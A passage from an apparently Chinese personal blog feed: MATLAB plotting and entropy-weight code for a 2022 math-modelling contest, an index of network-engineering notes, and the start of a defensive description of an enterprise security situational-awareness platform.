class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%PRK  </span>f<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">44</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">60</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">,</span><span class="token number">165</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%PAK  </span>g<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10114</span><span class="token punctuation">,</span><span class="token number">9076</span><span class="token punctuation">,</span><span class="token number">8038</span><span class="token punctuation">,</span><span class="token number">7000</span><span class="token punctuation">,</span><span class="token number">6643</span><span class="token punctuation">,</span><span class="token number">6286</span><span class="token punctuation">,</span><span class="token number">5929</span><span class="token punctuation">,</span><span class="token number">5527</span><span class="token punctuation">,</span><span class="token number">5215</span><span class="token punctuation">,</span><span class="token number">4858</span><span class="token punctuation">,</span><span class="token number">4750</span><span class="token punctuation">,</span><span class="token number">4650</span><span class="token punctuation">,</span><span class="token number">4600</span><span class="token punctuation">,</span><span class="token number">4500</span><span class="token punctuation">,</span><span class="token number">4490</span><span class="token punctuation">,</span><span class="token number">4300</span><span class="token punctuation">,</span><span class="token number">4350</span><span class="token punctuation">,</span><span class="token number">4330</span><span class="token punctuation">,</span><span class="token number">4310</span><span class="token punctuation">,</span><span class="token number">4495</span><span class="token punctuation">,</span><span class="token number">4477</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%RUS </span>h<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%ZAF  </span><span class="token number">i</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">280</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">225</span><span class="token punctuation">,</span><span class="token number">220</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">215</span><span class="token punctuation">,</span><span class="token number">210</span><span class="token punctuation">,</span><span class="token number">205</span><span class="token punctuation">,</span><span class="token number">195</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%GBR  </span><span class="token number">j</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10457</span><span class="token punctuation">,</span><span class="token number">10027</span><span class="token punctuation">,</span><span class="token number">8570</span><span class="token punctuation">,</span><span class="token number">8360</span><span class="token punctuation">,</span><span class="token number">7853</span><span class="token punctuation">,</span><span class="token number">5709</span><span class="token punctuation">,</span><span class="token number">5273</span><span class="token punctuation">,</span><span class="token number">5113</span><span class="token punctuation">,</span><span class="token number">5066</span><span class="token punctuation">,</span><span class="token number">4897</span><span class="token punctuation">,</span><span class="token number">4881</span><span class="token punctuation">,</span><span class="token number">4804</span><span class="token punctuation">,</span><span class="token number">4717</span><span class="token punctuation">,</span><span class="token number">4571</span><span class="token punctuation">,</span><span class="token number">4018</span><span class="token punctuation">,</span><span class="token number">3822</span><span class="token punctuation">,</span><span class="token number">3785</span><span class="token punctuation">,</span><span class="token number">3805</span><span class="token punctuation">,</span><span class="token number">3750</span><span class="token punctuation">,</span><span class="token number">3708</span><span class="token punctuation">,</span><span class="token number">3708</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">%USA </span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>e<span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>f<span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>g<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>h<span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Linear, color, marker  </span><span class="token function">axis</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%Determine the x-axis and y-axis block plot size </span><span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'XTick'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token number">22</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%xAxis range 2002-2022, interval 5  </span><span class="token function">set</span><span class="token punctuation">(</span>gca<span class="token punctuation">,</span><span class="token string">'YTick'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">2000</span><span class="token operator">:</span><span class="token number">12000</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">%yShaft range 0-12000 with 2000 intervals </span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'CHN'</span><span class="token punctuation">,</span><span class="token string">'FRA'</span><span class="token punctuation">,</span><span class="token string">'IND'</span><span class="token punctuation">,</span><span class="token string">'ISR'</span><span class="token punctuation">,</span><span class="token string">'PRK'</span><span class="token punctuation">,</span><span class="token string">'PAK'</span><span class="token punctuation">,</span><span class="token string">'RUS'</span><span class="token punctuation">,</span><span class="token string">'ZAF'</span><span class="token punctuation">,</span><span class="token string">'GBR'</span><span class="token punctuation">,</span><span class="token string">'USA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%Callout in the upper right corner  </span><span class="token function">xlabel</span><span class="token punctuation">(</span><span class="token string">'Year'</span><span class="token punctuation">)</span> <span class="token comment">%xDescription of axis coordinates </span><span class="token function">ylabel</span><span class="token punctuation">(</span><span class="token string">'Changes in nuclear weapons stocks'</span><span class="token punctuation">)</span> <span class="token comment">%yDescription of axis coordinates  </span><span class="token function">title</span><span class="token punctuation">(</span>"Nuclear weapons change line graph"<span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="code-3-Entropy-weight-law"><a href="#code-3-Entropy-weight-law" class="headerlink" title="code 3:Entropy weight law"></a>code 3:Entropy weight law</h4><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token punctuation">[</span>n1<span class="token punctuation">,</span>m1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">C</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">./</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">%CConstitute a matrix  </span><span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1 <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">./</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">end</span><span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n1 <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token keyword">if</span> <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span>  <span class="token function">P</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1E-6</span> <span class="token keyword">end</span><span class="token keyword">end</span> <span class="token keyword">end</span> <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1 <span class="token function">e</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token function">log</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token function">P</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">P</span><span class="token punctuation">(</span><span class="token operator">:</span><span class="token punctuation">,</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">%ultiply  </span><span class="token keyword">end</span> d<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>e <span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>m1<span class="token function">wn</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">sum</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token keyword">end</span>  s<span class="token operator">=</span>wn<span class="token operator">*</span>P<span class="token operator">'</span><span class="token punctuation">;</span>s<span class="token operator">=</span>s<span class="token operator">'</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>ssort<span class="token punctuation">,</span>id<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">sort</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token string">'descend'</span><span class="token punctuation">)</span><span class="token comment">%Get the result</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2022-APMCM-summary-sheet&quot;&gt;&lt;a href=&quot;#2022-APMCM-summary-sheet&quot; class=&quot;headerlink&quot; title=&quot;2022 APMCM summary sheet&quot;&gt;&lt;/a&gt;2022 APMCM sum</summary>
      
    
    
    
    <category term="数学建模" scheme="https://shierjinghuang.github.io/categories/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
    
    <category term="数学建模" scheme="https://shierjinghuang.github.io/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>网络工程相关整理汇总</title>
    <link href="https://shierjinghuang.github.io/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/"/>
    <id>https://shierjinghuang.github.io/2024/01/01/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%95%B4%E7%90%86%E6%B1%87%E6%80%BB/</id>
    <published>2024-01-01T04:24:35.000Z</published>
    <updated>2025-03-30T15:03:16.356Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h3 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h3><blockquote><p>负责定义传输数据的物理媒体和连接的电气特性。物理层关注的是比特流的传输，它定义了硬件设备之间的接口和传输媒体的特性，如电压、电流和光信号等 </p></blockquote><p>物理层规程</p><h3 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h3><h4 id="常规特性："><a href="#常规特性：" class="headerlink" title="常规特性："></a>常规特性：</h4><ul><li><h5 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a><a href="https://shierjinghuang.github.io/2022/11/21/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/">生成树协议</a></h5></li></ul><h4 id="高级特性："><a href="#高级特性：" class="headerlink" title="高级特性："></a>高级特性：</h4><ul><li><h5 id="生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP"><a href="#生成树的改进-RSTP与MSTP-https-shierjinghuang-github-io-2023-03-06-生成树的改进-RSTP与MSTP" class="headerlink" title="[生成树的改进 RSTP与MSTP](https://shierjinghuang.github.io/2023/03/06/生成树的改进 RSTP与MSTP/)"></a>[生成树的改进 RSTP与MSTP](<a href="https://shierjinghuang.github.io/2023/03/06/%E7%94%9F%E6%88%90%E6%A0%91%E7%9A%84%E6%94%B9%E8%BF%9B">https://shierjinghuang.github.io/2023/03/06/生成树的改进</a> RSTP与MSTP/)</h5></li></ul><h3 id="网际层："><a href="#网际层：" class="headerlink" title="网际层："></a>网际层：</h3><blockquote><p>网际层主要负责在不同的网络之间进行数据包的路由和转发，以确保数据能够从源主机传递到目标主机。该层定义了数据包的传输路径，决定了最佳的路径选择，以实现端到端的通信 </p></blockquote><h4 id="常规特性：-1"><a href="#常规特性：-1" class="headerlink" title="常规特性："></a>常规特性：</h4><blockquote><p>网际层常规特性包含日常学习中的关于网络协议的各种内容</p></blockquote><ul><li><h5 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/">网际协议IP</a></h5></li><li><h5 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li><li><h5 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a><a href="https://shierjinghuang.github.io/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/">地址解析协议 ARP</a></h5></li><li><h5 id="链路状态路由协议IS-IS"><a href="#链路状态路由协议IS-IS" class="headerlink" title="链路状态路由协议IS-IS"></a><a href="https://shierjinghuang.github.io/2023/03/26/%E9%93%BE%E8%B7%AF%E7%8A%B6%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AEIS-IS/">链路状态路由协议IS-IS</a></h5></li><li><h5 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a><a href="https://shierjinghuang.github.io/2022/11/16/IGMP/">Internet组管理协议IGMP</a></h5></li><li><h5 id="动态主机配置协议DHCP-1"><a href="#动态主机配置协议DHCP-1" class="headerlink" title="动态主机配置协议DHCP"></a><a href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/">动态主机配置协议DHCP</a></h5></li></ul><h4 id="高级特性：-1"><a href="#高级特性：-1" class="headerlink" title="高级特性："></a>高级特性：</h4><blockquote><p>IPv6协议栈： IPv6协议栈是指一套软件和硬件组件，用于实现和支持IPv6协议的网络通信。它包括各种层次的协议、服务和功能，以确保设备能够正确地使用IPv6进行通信 </p></blockquote><ul><li><p><strong><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议结构</a></strong></p></li><li><h5 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a><a href="https://shierjinghuang.github.io/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/">IPv6过渡技术</a></h5></li></ul><ul><li><h5 id="IGP高级特性"><a href="#IGP高级特性" class="headerlink" title="IGP高级特性"></a><a href="https://shierjinghuang.github.io/2024/01/01/IGP%E9%AB%98%E7%BA%A7%E7%89%B9%E6%80%A7/">IGP高级特性</a></h5><blockquote><p>IGP高级特性包括多种快速收敛和保护机制，用于降低网络故障导致的流量丢失，以及路由选路及路由信息的控制，能够减少特定路由器路由表的大小</p></blockquote></li><li></li></ul><h3 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h3><ul><li><h5 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a><a href="https://shierjinghuang.github.io/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/">传输层协议TCP与UDP</a></h5></li></ul><h3 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h3><ul><li><h5 id="RIP协议"><a href="#RIP协议" class="headerlink" title="RIP协议:"></a><a href="https://shierjinghuang.github.io/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/">RIP协议</a>:</h5><blockquote><p>rip是被当作一个应用层进程来实现的，所以它能在一个标准套接字上发送和接收报文，并且使用一个标准的运输层协议。RIP是一个运行在UDP上的应用层协议</p></blockquote></li><li><h5 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a><a href="https://shierjinghuang.github.io/2022/11/18/HTTP%E5%8D%8F%E8%AE%AE/">超文本传输协议HTTP</a></h5></li><li><h5 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a><a href="https://shierjinghuang.github.io/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/">文件传输协议FTP</a></h5></li></ul><h3 id="汇总："><a href="#汇总：" class="headerlink" title="汇总："></a>汇总：</h3><ul><li><p><a href="https://shierjinghuang.github.io/2022/12/15/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E6%B1%87%E6%80%BB/">IPV4网络协议分析汇总</a></p></li><li><p><a href="https://shierjinghuang.github.io/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/">IPv6协议部分</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;物理层：&quot;&gt;&lt;a href=&quot;#物理层：&quot; class=&quot;headerlink&quot; title=&quot;物理层：&quot;&gt;&lt;/a&gt;物理层：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;负责定义传输数据的物理媒体和连接的电气特性。物理层关注的是比特流的传输，</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="HCIP" scheme="https://shierjinghuang.github.io/tags/HCIP/"/>
    
  </entry>
  
  <entry>
    <title>网络安全态势感知与管控平台</title>
    <link href="https://shierjinghuang.github.io/2023/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E4%B8%8E%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0/"/>
    <id>https://shierjinghuang.github.io/2023/10/02/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E4%B8%8E%E7%AE%A1%E6%8E%A7%E5%B9%B3%E5%8F%B0/</id>
    <published>2023-10-02T09:53:37.000Z</published>
    <updated>2025-04-02T11:49:37.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安全态势感知与管控平台">安全态势感知与管控平台</h2><p>[TOC]</p><h3 id="1-面临问题和挑战">1. 面临问题和挑战</h3><h4 id="1-1-面临问题">1.1. 面临问题</h4><p>随着各类信息技术及软硬件系统的持续演进，信息安全问题日益严峻，而且我国当前信息系统安全产业及相关安全法律法规及其标准也不甚完善，这导致国内信息安全保障工作严重滞后于信息技术发展的速度。</p><p>由此，目前各企业 IT 系统安全面临巨大的困境，主要包括：</p><ul><li>落后的边界隔离理念 VS 灵活多变的渗透技术</li><li>日益臃肿的攻击特征库 VS 专业智能的 SaaS 服务</li><li>一片祥和的监控页面 VS 暗流涌动的隐蔽信道</li></ul><p>总而言之，只重视边界的防护，而忽视内部系统的安全问题的传统观念已经 无法适应当前日益严峻的安全形势；没有安全事件和告警不等于没有被攻击者盯 上和攻击。</p><h4 id="1-2-当前挑战">1.2. 当前挑战</h4><p>企业面临的信息安全挑战包括：</p><ol><li><p>企业购置了大量安全设备及产品，但这些产品所报告出来的问题往往不是难于理解就是极其分散，从而无法确定当前企业的网络和系统运行到底是否安全；</p></li><li><p>一般安全设备所报告的安全事件，往往存在误报率高，需要人工甄别；</p></li><li><p>传统安全设备或系统只会报告当前发生了什么，而无法对未来的安全形势进行预判，简而言之，就是缺乏一定的安全形势预估能力；</p></li><li><p>传统的安全设备，如入侵检测或入侵防护一般不会存储过程数据，所以在出现安全问题时，完全无法对历史数据进行回溯，所以如何调查安全事件变成了不可能的任务；</p></li><li><p>一般的传统的安全设备，无论是防火墙、入侵检测/入侵防护、防病毒等系统都是利用特征库对相关安全问题进行检测，如果数据被加密或者被做了免杀处理，则无能为力。</p></li></ol><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\企业面临的信息安全挑战.png" style="zoom:80%;" /><h3 id="2-客户需求">2. 客户需求</h3><p>针对上述问题和挑战，一般企业的信息安全管理人员不仅对各类<strong>安全合规</strong>方面功能有着较高要求，而且对这在<strong>日常安全问题的发现、潜在问题的萃取、未发生问题的预防</strong>等都有较高期望，特别是对于一些<strong>隐蔽安全问题的追根溯源</strong>（包括各类高级持续威胁等），也有现实需求，包括：</p><ol><li><p>通过企业网站等途径的外部渗透行为；</p></li><li><p>通过邮件钓鱼等途径的鱼叉攻击行为；</p></li><li><p>访问控制混乱而导致的隐蔽通道或服务端口暴露问题；</p></li><li><p>内部潜在威胁源或威胁用户的发现；</p></li><li><p>潜在的数据泄露或外传风险；</p></li><li><p>安全问题爆发时的预警和处置；</p></li><li><p>其它各类用户或异常行为的侦测，如异常地区访问、异常时间访问、异常访问次数、异常用户类别等。</p></li></ol><h3 id="3-安全态势与管控平台解决方案">3. 安全态势与管控平台解决方案</h3><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\安全态势与管控平台解决方案.png" style="zoom:50%;" /><p>网络科技自主开发的基于大数据技术的安全态势感知与管控平台，统一采集各类结构化和非结构化的数据，包括各类设备、应用日志以及网络流量和各种脆弱性，提供基于标准风险模型通过实时分析、离线分析、关联分析、统计分析、规则库、专家经验库以及外部安全情报的交换、机器学习等多方位进行风险分析。</p><p>安全态势感知与管控平台，充分收集各类安全相关数据，通过大范围和深度地广泛检查，尽可能发现相关安全问题</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\全方位的信息采集.png" style="zoom: 80%;" /><h4 id="3-1-解决方案整体框架">3.1. 解决方案整体框架</h4><p>安全态势感知与管控平台，具有完全分布式的数据采集和分析框架，包含了数据采集、数据预处理、数据分析、高级分析、数据可视以及安全处理和响应、安全知识库（含漏洞库、安全事件库、安全配置库等等），如下图所示：</p><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\解决方案整体框架.png" style="zoom: 50%;" /><h4 id="3-2-方案组成">3.2. 方案组成</h4><p>与传统的安全管理中心 [SOC]或下一代安全管理中心 [NGSOC]不完全相同的是 传统 SOC 或 [NGSOC 均是依赖于收集第三方日志或脆弱性，在问题的解读和追溯上存在非常大的不足，因而不足以支撑整体安全管理] ，由于安全态势感知与管控平台集成了众多自有的安全问题感知子模块，这些安全感知子模块包含了如下内容：</p><ul><li>网络攻击检测子模块</li><li>网络性能检测子模块</li><li>文件安全检测子模块</li><li>威胁情报检测子模块</li><li>日志安全审计子模块</li><li>漏洞扫描检查子模块</li><li>安全配置核查子模块</li></ul><p>另外，除上述基础安全检测子模块外，安全态势感知与管控平台还综合了如下高级安全检查功能：</p><ul><li>安全对象失陷分析子模块</li><li>安全问题告警分析子模块</li><li>主机及用户行为分析子模块</li><li>网站安全检测分析子模块</li><li>安全风险分析子模块</li></ul><img src="D:\blog\shierjinghuang\source\_posts\网络安全态势感知与管控平台\安全态势感知模块与子模块的对应.png" style="zoom: 50%;" /><p>除了上述各类模块外，为了向用户提供完善的安全运维能力，安全态势感知与管控平台提供了完善的安全资产管理模块、安全运维工单模块以及安全知识库等模块。</p><h4 